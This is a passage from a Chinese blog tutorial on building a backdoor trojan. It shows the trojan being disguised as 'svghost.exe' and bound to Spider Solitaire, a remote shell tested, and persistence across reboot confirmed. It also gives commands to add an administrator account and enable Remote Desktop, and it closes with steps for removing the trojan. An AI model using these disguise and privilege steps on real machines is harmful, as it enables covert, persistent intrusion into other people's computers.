+<p>我们可以从网上找到一些辅助工具，来帮助我们。我找了一款叫做ExeBinder.exe的软件。</p>
+<p><img src="%5Cimages%5Cpasted-2.png" alt="upload successful"></p>
+<p>这个程序可以将两个可执行文件捆绑为一个，但是在点击运行的时候，会同时运行两个文件。</p>
+<p>对我们的木马来说，简直就是量身定制。</p>
+<p>首先，将前面我们提到的功能，做一个封装，写成一个exe文件：叫做torjan.exe</p>
+<p>（后面为了伪装效果，更改了程序名为svghost.exe）</p>
+<p>再来看看现在的启动文件夹和注册表内容：</p>
+<p><img src="%5Cimages%5Cpasted-3.png" alt="upload successful"><br>Ok,非常好。</p>
+<p>运行一下我们的exe文件</p>
+<p><img src="%5Cimages%5Cpasted-4.png" alt="upload successful"></p>
+<p>可以看到启动文件夹和注册表项中，已经添加了。</p>
+<p>功能正常，现在我们将它和正常的程序绑在一起，这里选择了<strong>蜘蛛纸牌</strong>，当然我们可以选择自己写的其他有趣的代码。</p>
+<p><img src="%5Cimages%5Cpasted-5.png" alt="upload successful"></p>
+<h5 id="3-木马测试"><a href="#3-木马测试" class="headerlink" title="3.木马测试"></a>3.木马测试</h5><p>首先肯定是靶机需要运行一次上面这个木马，才可以连接。</p>
+<h6 id="连接测试"><a href="#连接测试" class="headerlink" title="-连接测试"></a>-连接测试</h6><p>接下来，我们就来测试一下，我们是否能远程连接到靶机。</p>
+<p>尝试使用另一台电脑（win10+Powershell）进行连接</p>
+<p><img src="%5Cimages%5Cpasted-6.png" alt="upload successful"></p>
+<p>成功弹回了shell。</p>
+<h6 id="靶机观察"><a href="#靶机观察" class="headerlink" title="-靶机观察"></a>-靶机观察</h6><p>运行后，我们观察任务管理器：只显示蜘蛛纸牌，非常nice!</p>
+<p><img src="%5Cimages%5Cpasted-7.png" alt="upload successful"><br>我们再来看看进程下面，</p>
+<p><img src="%5Cimages%5Cpasted-8.png" alt="upload successful"></p>
+<h6 id="重启再连接"><a href="#重启再连接" class="headerlink" title="-重启再连接"></a>-重启再连接</h6><p><img src="%5Cimages%5Cpasted-9.png" alt="upload successful"></p>
+<p>电脑刚打开，提示开机时间时，已经可以连接到目标。</p>
+<h5 id="4-更多操作"><a href="#4-更多操作" class="headerlink" title="4.更多操作"></a>4.更多操作</h5><p>我们连接到远程shell后，可以新建一个用户，然后加入管理员组。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin /add    //创建admin 用户 密码为空</span><br><span class="line">net localgroup adminators admin /add    //赋与admin用户，管理员权限</span><br></pre></td></tr></table></figure>
+
+<p>然后开启远程桌面功能（也就是3389端口），连接后将自己这个用户隐藏掉。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span></span><br></pre></td></tr></table></figure>
+
+<p>but…….我在这里，并没有开启，原因是命令行提示我参数过多，可能是telnet过来的命令行，有点问题。</p>
+<p>大家感兴趣可以自己试试。</p>
+<h4 id="五、木马清除"><a href="#五、木马清除" class="headerlink" title="五、木马清除"></a>五、木马清除</h4><blockquote>
+<p>首先，我们需要观察自启动文件夹，将不正常和非必要自启动的程序全部删除。</p>
+<p>然后，注册表自启动，所有Run下面的每个键值都要检查，尤其是值为某路径下.exe，你又不知道这个exe是什么，到对应目录查看该文件，删除键值。</p>
+</blockquote>
+<p>清除木马，因为本木马使用了伪装，复制和注册表项，我们需要一一清除：</p>
+<p>首先打开任务管理器，关闭蜘蛛纸牌应用程序，从进程中找到svghost.exe所有者为administrator，结束掉该进程；</p>
+<p>然后，打开本地C盘启动文件夹，删除svghost.exe程序；</p>
+<p>同时，删除本地的捆绑了木马的蜘蛛纸牌（或其他应用）；</p>
+<p>最后，打开注册表，进入自启动项（有很多，Run下面的都要仔细检查，但是本木马使用了比较经典的位置），HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run，删除包含svghost.exe的对应键值关系。</p>
+<p>重启电脑。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/kinnisoy">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"># 木马</a>
+              <a href="/tags/windows%E7%BC%96%E7%A8%8B/" rel="tag"># windows编程</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/29/1-Hexo%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E6%8C%87%E5%8C%97/" rel="prev" title="#1 Hexo框架安装指北">
+      <i class="fa fa-chevron-left"></i> #1 Hexo框架安装指北
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#目的"><span class="nav-number">1.</span> <span class="nav-text">目的</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一、木马是什么？"><span class="nav-number">1.0.1.</span> <span class="nav-text">一、木马是什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二、木马隐藏技术"><span class="nav-number">1.0.2.</span> <span class="nav-text">二、木马隐藏技术</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三、木马程序原理："><span class="nav-number">1.0.3.</span> <span class="nav-text">三、木马程序原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四、编写后门型木马："><span class="nav-number">1.0.4.</span> <span class="nav-text">四、编写后门型木马：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-木马的功能模块图"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">1.木马的功能模块图</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-代码实现各个部分"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">2.代码实现各个部分</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#开机自启动"><span class="nav-number">1.0.4.2.1.</span> <span class="nav-text">-开机自启动</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#将自己加入注册表启动项"><span class="nav-number">1.0.4.2.2.</span> <span class="nav-text">-将自己加入注册表启动项</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#开启端口"><span class="nav-number">1.0.4.2.3.</span> <span class="nav-text">-开启端口</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#文件伪装"><span class="nav-number">1.0.4.2.4.</span> <span class="nav-text">-文件伪装</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-木马测试"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">3.木马测试</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#连接测试"><span class="nav-number">1.0.4.3.1.</span> <span class="nav-text">-连接测试</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#靶机观察"><span class="nav-number">1.0.4.3.2.</span> <span class="nav-text">-靶机观察</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#重启再连接"><span class="nav-number">1.0.4.3.3.</span> <span class="nav-text">-重启再连接</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-更多操作"><span class="nav-number">1.0.4.4.</span> <span class="nav-text">4.更多操作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#五、木马清除"><span class="nav-number">1.0.5.</span> <span class="nav-text">五、木马清除</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="KinniSoy"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">KinniSoy</p>
+  <div class="site-description" itemprop="description">層樓終究誤少年，自由早晚亂餘生。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kinnisoy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kinnisoy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:kinnisoy@sina.com" title="E-Mail → mailto:kinnisoy@sina.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/kinnisoy" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;kinnisoy" rel="noopener" target="_blank"><i class="fab fa-stack-overflow fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/kinnisoy" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;kinnisoy" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KinniSoy</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_pv"></span>
+</span>
+</div>
+<!--  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
